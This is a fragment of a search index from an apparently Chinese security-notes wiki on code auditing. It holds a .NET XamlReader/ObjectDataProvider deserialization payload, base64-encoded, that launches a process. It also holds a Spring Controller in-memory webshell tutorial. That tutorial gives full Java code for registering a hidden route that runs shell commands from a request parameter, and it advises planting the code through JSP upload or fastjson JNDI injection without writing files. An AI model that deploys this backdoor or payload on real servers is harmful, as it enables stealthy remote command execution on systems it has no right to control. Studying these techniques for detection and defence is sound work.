1.\u5b9e\u4f8b\u5316XmlSerializer\u65f6\u4f20\u5165\u7684type\u53ef\u63a7\uff0c\u4e14XmlSerializer.Deserialize\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4f46\u662f\u7531\u4e8eDeserialize\u65b9\u6cd5\u5e76\u4e0d\u80fd\u63a5\u6536string\u53c2\u6570\uff0c\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u601d\u8def\u53ef\u80fd\u66f4\u52a0\u9002\u5408\u901a\u8fc7\u4ee3\u7801\u5ba1\u8ba1\u53d1\u73b0\u4e00\u4e9b\u65b0\u7684\u94fe\uff08\u8fd9\u6837\u7684\u8bdd\u5c31\u6ca1\u5fc5\u8981\u7528\u5230ResourceDictionary\u4e86\uff09 2.\u4f7f\u7528XamlReader.Parse \uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u4f20\u5165string\u53c2\u6570 \u4e0b\u9762\u7528XamlReader.Parse\u89e3\u6790\u4e00\u4e0b\u4e0a\u9762\u7684xaml string p = \"PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==\"; byte[] vs = Convert.FromBase64String(p); string xml = Encoding.UTF8.GetString(vs); XamlReader.Parse(xml);","title":"ResourceDictionary"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#ref","text":"https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md https://www.anquanke.com/post/id/172316#h3-8 https://blog.51cto.com/u_13953961/3106574","title":"Ref:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/JAVA/","text":"JAVA \u53cd\u5e8f\u5217\u5316 \u5185\u5b58\u9a6c \u5ba1\u8ba1\u6280\u5de7 \u6316\u6d1e\u8bb0\u5f55 \u8ddf\u8e2a\u590d\u73b0\u6c89\u6dc0","title":"JAVA"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/JAVA/#java","text":"\u53cd\u5e8f\u5217\u5316 \u5185\u5b58\u9a6c \u5ba1\u8ba1\u6280\u5de7 \u6316\u6d1e\u8bb0\u5f55 \u8ddf\u8e2a\u590d\u73b0\u6c89\u6dc0","title":"JAVA"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/%E5%86%85%E5%AD%98%E9%A9%AC/","text":"\u5185\u5b58\u9a6c tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790 tomcat websocket\u5185\u5b58\u9a6c Spring Controller\u5185\u5b58\u9a6c java agent\u5185\u5b58\u9a6c","title":"\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/%E5%86%85%E5%AD%98%E9%A9%AC/#_1","text":"tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790 tomcat websocket\u5185\u5b58\u9a6c Spring Controller\u5185\u5b58\u9a6c java agent\u5185\u5b58\u9a6c","title":"\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/","text":"Spring Controller\u5185\u5b58\u9a6c \u76ee\u5f55 @Controller\u548c@RequestMapping Controller \u5185\u5b58\u9a6c \u521b\u5efacontroller \u5199\u5165 \u603b\u7ed3 \u672c\u8282\u53c2\u8003 @Controller\u548c@RequestMapping Spring 2.5 \u7248\u672c\u65b0\u589e\u4e86 Spring MVC \u6ce8\u89e3\u529f\u80fd\uff0c\u7528\u4e8e\u66ff\u6362\u4f20\u7edf\u7684\u57fa\u4e8e XML \u7684 Spring MVC \u914d\u7f6e\u3002 \u9700\u8981\u5728 xxx-servlet.xml\u6587\u4ef6\u4e2d\u6dfb\u52a0\u76f8\u5173\u5c5e\u6027\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\u3002 <context:component-scan base-package=\"test.SpringMVC\" /> base-package\u6307\u5411\u63a7\u5236\u5668\u4eec\u7684\u5305\u540d \u540c\u65f6\u5728<beans>\u6807\u7b7e\u4e2d\u52a0\u5165\u4ee5\u4e0b\u5c5e\u6027 xmlns:context=\"http://www.springframework.org/schema/context\" \u52a0\u4e86\u540e\u770b\u8d77\u6765\u5c31\u50cf\u8fd9\u6837 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"> <bean name=\"/hello\" class=\"test.SpringMVC.Hello\"></bean> <bean name=\"/fuck\" class=\"test.SpringMVC.Fuck\"></bean> <context:component-scan base-package=\"test.SpringMVC\" /> </beans> package test.SpringMVC; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.servlet.ModelAndView; @Controller //\u6807\u8bc6\u8fd9\u662f\u4e00\u4e2a\u63a7\u5236\u5668\u7c7b public class test { @RequestMapping(value=\"test\") //value\u6307\u5b9a\u8def\u7531\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u8bb8\u591a\u5c5e\u6027\uff0c\u8be6\u89c1\u4e8ehttp://c.biancheng.net/spring_mvc/controller-requestmapping.html public ModelAndView testfunc(HttpServletRequest request, HttpServletResponse response) { ModelAndView msv = new ModelAndView(\"/WEB-INF/view/fuck.jsp\"); msv.addObject(\"message\",\"test,jsut test\"); return msv; } } \u8fd0\u884c Controller \u5185\u5b58\u9a6c \u5927\u81f4\u5c31\u662f\u76f4\u63a5\u5728\u5185\u5b58\u521b\u4e00\u4e2acontroller\u6765\u5b9e\u73b0\u540e\u95e8\u529f\u80fd\u3002 \u6211\u4eec\u4ece\u4e0a\u9762\u7684SpringMVC\u4ecb\u7ecd\u4e2d\u77e5\u9053\u4e86Controller\u7684\u4e00\u79cd\u521b\u5efa\u65b9\u5f0f\uff0c\u90a3\u4fbf\u662f\u76f4\u63a5\u5199\u63a7\u5236\u5668\u7c7b\u5230\u6587\u4ef6\u4e2d\uff0c\u670d\u52a1\u5668\u8fd0\u884c\u65f6\u6fc0\u6d3b\u6587\u4ef6\u4e2d\u63a7\u5236\u5668\u7c7b\u3002 \u5982\u679c\u6211\u4eec\u7528\u8fd9\u4e2a\u60f3\u6cd5\u53bb\u5b9e\u73b0\u5185\u5b58\u9a6c\uff0c\u90a3\u5927\u81f4\u5b9e\u73b0\u6b65\u9aa4\u5c31\u662f\uff1a\u60f3\u529e\u6cd5\u76f4\u63a5\u628a\u6076\u610fcontroller\u7c7b\u7684java\u6587\u4ef6\u5199\u5165\u5230\u9879\u76ee\u8def\u5f84\uff0c\u7136\u540e\u7b49\u5f85\u670d\u52a1\u5668\u91cd\u542f\uff0c\u7136\u540e\u8bbf\u95ee\u6076\u610fcontroller\u7c7b\u6307\u5b9a\u7684\u8def\u7531\u5b9e\u73b0\u6076\u610f\u64cd\u4f5c\u3002 \u8fd9\u4e2a\u601d\u8def\u663e\u7136\u662f\u5f88\u4e0d\u73b0\u5b9e\u7684\uff0c\u8fd9\u6837\u65e2\u8981\u7b49\u5230\u670d\u52a1\u5668\u91cd\u542f\uff0c\u5e76\u4e14\u6211\u4eec\u7684\u9a6c\u4ee5\u6587\u4ef6\u7684\u5f62\u5f0f\u843d\u5730\u4e86\uff0c\u6781\u6613\u88ab\u6392\u67e5\u51fa\u3002| \u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u65b9\u6cd5\u80fd\u5728\u670d\u52a1\u5668\u8fd0\u884c\u65f6\u76f4\u63a5\u5728\u5176\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2acontroller\u7684\u65b9\u6cd5\u5462\uff1f \u521b\u5efacontroller \u83b7\u53d6\u4e0a\u4e0b\u6587\u73af\u5883\u5757 \u5728\u521b\u5efacontroller\u65f6\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u9700\u8981\u5f53\u524d\u73af\u5883\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5757\uff08context\uff09\u6765\u8fbe\u5230\u76ee\u7684\u3002 \u201cSpring\u5e94\u7528\u4e2d\u53ef\u4ee5\u540c\u65f6\u6709\u591a\u4e2aContext\uff0c\u5176\u4e2d\u53ea\u6709\u4e00\u4e2aRoot Context\uff0c\u5269\u4e0b\u7684\u5168\u662fChild Context \u6240\u6709Child Context\u90fd\u53ef\u4ee5\u8bbf\u95ee\u5728Root Context\u4e2d\u5b9a\u4e49\u7684bean\uff0c\u4f46\u662fRoot Context\u65e0\u6cd5\u8bbf\u95eeChild Context\u4e2d\u5b9a\u4e49\u7684bean \u6240\u6709\u7684Context\u5728\u521b\u5efa\u540e\uff0c\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e00\u4e2a\u5c5e\u6027\u6dfb\u52a0\u5230\u4e86ServletContext\u4e2d\u201d \u83b7\u53d6\u4e0a\u4e0b\u6587\u73af\u5883\u5757\u7684\u65b9\u6cd5\u6709\u8fd9\u4e9b\uff1a \u524d\u4e24\u79cd\u83b7\u5f97RootWebApplicationContext\uff0c\u540e\u4e24\u79cd\u83b7\u5f97Child WebApplicationContext WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); \"\u4e0a\u6587\u5c55\u793a\u7684\u56db\u79cd\u83b7\u5f97\u5f53\u524d\u4ee3\u7801\u8fd0\u884c\u65f6\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u7684\u65b9\u6cd5\u4e2d\uff0c\u63a8\u8350\u4f7f\u7528\u540e\u9762\u4e24\u79cd\u65b9\u6cd5\u83b7\u5f97 Child WebApplicationContext\u3002 \u8fd9\u662f\u56e0\u4e3a\uff1a\u6839\u636e\u4e60\u60ef\uff0c\u5728\u5f88\u591a\u5e94\u7528\u914d\u7f6e\u4e2d\u6ce8\u518cController \u7684 component-scan \u7ec4\u4ef6\u90fd\u914d\u7f6e\u5728\u7c7b\u4f3c\u7684 dispatcherServlet-servlet.xml \u4e2d\uff0c\u800c\u4e0d\u662f\u5168\u5c40\u914d\u7f6e\u6587\u4ef6 applicationContext.xml \u4e2d\u3002 \u8fd9\u6837\u5c31\u5bfc\u81f4 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u53ea\u5b58\u5728\u4e8e Child WebApplicationContext \u73af\u5883\u4e2d\uff0c\u800c\u4e0d\u662f Root WebApplicationContext \u4e2d\u3002\u4e0a\u6587\u4e5f\u63d0\u5230\u8fc7\uff0cRoot Context\u65e0\u6cd5\u8bbf\u95eeChild Context\u4e2d\u5b9a\u4e49\u7684 bean\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5bfc\u81f4 Root WebApplicationContext \u83b7\u5f97\u4e0d\u4e86 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u7684\u60c5\u51b5\u3002\" 1.\u5728 spring 4.0 \u53ca\u4ee5\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 registerMapping \u76f4\u63a5\u6ce8\u518c requestMapping \uff0c\u8fd9\u662f\u6700\u76f4\u63a5\u7684\u4e00\u79cd\u65b9\u5f0f\u3002 RequestMappingHandlerMapping \u7c7b\u7684registerMapping\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u6ce8\u518cController. // 1. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. \u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u81ea\u5b9a\u4e49 controller \u4e2d\u552f\u4e00\u7684 Method \u5bf9\u8c61 Method method = (Class.forName(\"me.landgrey.SSOLogin\").getDeclaredMethods())[0]; // 3. \u5b9a\u4e49\u8bbf\u95ee controller \u7684 URL \u5730\u5740 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. \u5b9a\u4e49\u5141\u8bb8\u8bbf\u95ee controller \u7684 HTTP \u65b9\u6cd5\uff08GET/POST\uff09 RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. \u5728\u5185\u5b58\u4e2d\u52a8\u6001\u6ce8\u518c controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"me.landgrey.SSOLogin\").newInstance(), method); registerHandler // 1. \u5728\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u6ce8\u518c\u4e00\u4e2a\u540d\u4e3a dynamicController \u7684 Webshell controller \u5b9e\u4f8b bean context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"me.landgrey.SSOLogin\").newInstance()); // 2. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 DefaultAnnotationHandlerMapping \u7684\u5b9e\u4f8b bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. \u53cd\u5c04\u83b7\u5f97 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class); m1.setAccessible(true); // 4. \u5c06 dynamicController \u548c URL \u6ce8\u518c\u5230 handlerMap \u4e2d m1.invoke(dh, \"/favicon\", \"dynamicController\"); detectHandlerMethods context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"me.landgrey.SSOLogin\").newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \"dynamicController\"); \u5199\u5165 \u5982\u4f55\u5728\u5b9e\u6218\u4e2d\u5199\u5165controller\u5185\u5b58\u9a6c\u5462\uff1f 1.\u4e0a\u4f20\u4e00\u4e2a\u6ce8\u518ccontroller\u7684JSP\u6587\u4ef6\u5e76\u8bbf\u95ee\uff0c\u7136\u540e\u628aJSP\u5220\u4e86\u3002 2.JNDI\u6ce8\u5165\uff0c\u5982\u679c\u6709fastjson\u7b49\u7ec4\u4ef6\u4e14\u6709\u6d1e\uff0c\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\uff0c\u5b8c\u5168\u5730\u4e0d\u843d\u5730\u3002 \u7f51\u4e0a\u5ad6\u7684\u4ee3\u7801\u3002 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; import java.util.Iterator; import java.util.List; import java.util.Map; public class InjectToController { // \u7b2c\u4e00\u4e2a\u6784\u9020\u51fd\u6570 public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // \u53ef\u9009\u6b65\u9aa4\uff0c\u5224\u65adurl\u662f\u5426\u5b58\u5728 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List<String> urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/malicious\".equals(urlPath)){ System.out.println(\"url\u5df2\u5b58\u5728\"); return; } } // \u53ef\u9009\u6b65\u9aa4\uff0c\u5224\u65adurl\u662f\u5426\u5b58\u5728 // 2. \u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u81ea\u5b9a\u4e49 controller \u4e2dtest\u7684 Method \u5bf9\u8c61 Method method2 = InjectToController.class.getMethod(\"test\"); // 3. \u5b9a\u4e49\u8bbf\u95ee controller \u7684 URL \u5730\u5740 PatternsRequestCondition url = new PatternsRequestCondition(\"/malicious\"); // 4. \u5b9a\u4e49\u5141\u8bb8\u8bbf\u95ee controller \u7684 HTTP \u65b9\u6cd5\uff08GET/POST\uff09 RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. \u5728\u5185\u5b58\u4e2d\u52a8\u6001\u6ce8\u518c controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // \u521b\u5efa\u7528\u4e8e\u5904\u7406\u8bf7\u6c42\u7684\u5bf9\u8c61\uff0c\u52a0\u5165\u201caaa\u201d\u53c2\u6570\u662f\u4e3a\u4e86\u89e6\u53d1\u7b2c\u4e8c\u4e2a\u6784\u9020\u51fd\u6570\u907f\u514d\u65e0\u9650\u5faa\u73af InjectToController injectToController = new InjectToController(\"aaa\"); mappingHandlerMapping.registerMapping(info, injectToController, method2); } // \u7b2c\u4e8c\u4e2a\u6784\u9020\u51fd\u6570 public InjectToController(String aaa) {} // controller\u6307\u5b9a\u7684\u5904\u7406\u65b9\u6cd5 public void test() throws IOException{ // \u83b7\u53d6request\u548cresponse\u5bf9\u8c61 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // \u83b7\u53d6cmd\u53c2\u6570\u5e76\u6267\u884c\u547d\u4ee4 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } } \u603b\u7ed3 \u83b7\u53d6\u4e0a\u4e0b\u6587\uff08\u5b50\u4e0a\u4e0b\u6587\u6700\u597d\uff0c\u56e0\u4e3aROOT applicationContext\u4e0d\u4e00\u5b9a\u80fd\u83b7\u5f97\u6211\u4eec\u60f3\u8981\u7684bean\uff0c\u800cChildapplication\u53ef\u4ee5\uff09\u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u5411RequestMappingInfo\u4f20\u5165HTTP\u65b9\u6cd5\u548curl\u83b7\u53d6\u4e00\u4e2aRequestMappingInfo\u5bf9\u8c61\uff08info\uff09 \u5b9a\u4e49Method\u5bf9\u8c61\uff0c\u4ee5\u53ca\u4efb\u610f\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6267\u884cregisterMapping\u51fd\u6570\u5b8c\u6210\u6ce8\u518c mappingHandlerMapping.registerMapping(info, injectToController, method2); \u672c\u8282\u53c2\u8003 https://www.anquanke.com/post/id/198886#h3-7 https://www.cnblogs.com/bitterz/p/14820898.html#11-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjndi","title":"Spring Controller\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#spring-controller","text":"","title":"Spring Controller\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#_1","text":"@Controller\u548c@RequestMapping Controller \u5185\u5b58\u9a6c \u521b\u5efacontroller \u5199\u5165 \u603b\u7ed3 \u672c\u8282\u53c2\u8003","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#controllerrequestmapping","text":"Spring 2.5 \u7248\u672c\u65b0\u589e\u4e86 Spring MVC \u6ce8\u89e3\u529f\u80fd\uff0c\u7528\u4e8e\u66ff\u6362\u4f20\u7edf\u7684\u57fa\u4e8e XML \u7684 Spring MVC \u914d\u7f6e\u3002 \u9700\u8981\u5728 xxx-servlet.xml\u6587\u4ef6\u4e2d\u6dfb\u52a0\u76f8\u5173\u5c5e\u6027\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\u3002 <context:component-scan base-package=\"test.SpringMVC\" /> base-package\u6307\u5411\u63a7\u5236\u5668\u4eec\u7684\u5305\u540d \u540c\u65f6\u5728<beans>\u6807\u7b7e\u4e2d\u52a0\u5165\u4ee5\u4e0b\u5c5e\u6027 xmlns:context=\"http://www.springframework.org/schema/context\" \u52a0\u4e86\u540e\u770b\u8d77\u6765\u5c31\u50cf\u8fd9\u6837 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"> <bean name=\"/hello\" class=\"test.SpringMVC.Hello\"></bean> <bean name=\"/fuck\" class=\"test.SpringMVC.Fuck\"></bean> <context:component-scan base-package=\"test.SpringMVC\" /> </beans> package test.SpringMVC; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.servlet.ModelAndView; @Controller //\u6807\u8bc6\u8fd9\u662f\u4e00\u4e2a\u63a7\u5236\u5668\u7c7b public class test { @RequestMapping(value=\"test\") //value\u6307\u5b9a\u8def\u7531\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u8bb8\u591a\u5c5e\u6027\uff0c\u8be6\u89c1\u4e8ehttp://c.biancheng.net/spring_mvc/controller-requestmapping.html public ModelAndView testfunc(HttpServletRequest request, HttpServletResponse response) { ModelAndView msv = new ModelAndView(\"/WEB-INF/view/fuck.jsp\"); msv.addObject(\"message\",\"test,jsut test\"); return msv; } } \u8fd0\u884c","title":"@Controller\u548c@RequestMapping"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#controller","text":"\u5927\u81f4\u5c31\u662f\u76f4\u63a5\u5728\u5185\u5b58\u521b\u4e00\u4e2acontroller\u6765\u5b9e\u73b0\u540e\u95e8\u529f\u80fd\u3002 \u6211\u4eec\u4ece\u4e0a\u9762\u7684SpringMVC\u4ecb\u7ecd\u4e2d\u77e5\u9053\u4e86Controller\u7684\u4e00\u79cd\u521b\u5efa\u65b9\u5f0f\uff0c\u90a3\u4fbf\u662f\u76f4\u63a5\u5199\u63a7\u5236\u5668\u7c7b\u5230\u6587\u4ef6\u4e2d\uff0c\u670d\u52a1\u5668\u8fd0\u884c\u65f6\u6fc0\u6d3b\u6587\u4ef6\u4e2d\u63a7\u5236\u5668\u7c7b\u3002 \u5982\u679c\u6211\u4eec\u7528\u8fd9\u4e2a\u60f3\u6cd5\u53bb\u5b9e\u73b0\u5185\u5b58\u9a6c\uff0c\u90a3\u5927\u81f4\u5b9e\u73b0\u6b65\u9aa4\u5c31\u662f\uff1a\u60f3\u529e\u6cd5\u76f4\u63a5\u628a\u6076\u610fcontroller\u7c7b\u7684java\u6587\u4ef6\u5199\u5165\u5230\u9879\u76ee\u8def\u5f84\uff0c\u7136\u540e\u7b49\u5f85\u670d\u52a1\u5668\u91cd\u542f\uff0c\u7136\u540e\u8bbf\u95ee\u6076\u610fcontroller\u7c7b\u6307\u5b9a\u7684\u8def\u7531\u5b9e\u73b0\u6076\u610f\u64cd\u4f5c\u3002 \u8fd9\u4e2a\u601d\u8def\u663e\u7136\u662f\u5f88\u4e0d\u73b0\u5b9e\u7684\uff0c\u8fd9\u6837\u65e2\u8981\u7b49\u5230\u670d\u52a1\u5668\u91cd\u542f\uff0c\u5e76\u4e14\u6211\u4eec\u7684\u9a6c\u4ee5\u6587\u4ef6\u7684\u5f62\u5f0f\u843d\u5730\u4e86\uff0c\u6781\u6613\u88ab\u6392\u67e5\u51fa\u3002| \u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u65b9\u6cd5\u80fd\u5728\u670d\u52a1\u5668\u8fd0\u884c\u65f6\u76f4\u63a5\u5728\u5176\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2acontroller\u7684\u65b9\u6cd5\u5462\uff1f","title":"Controller \u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#controller_1","text":"\u83b7\u53d6\u4e0a\u4e0b\u6587\u73af\u5883\u5757 \u5728\u521b\u5efacontroller\u65f6\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u9700\u8981\u5f53\u524d\u73af\u5883\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5757\uff08context\uff09\u6765\u8fbe\u5230\u76ee\u7684\u3002 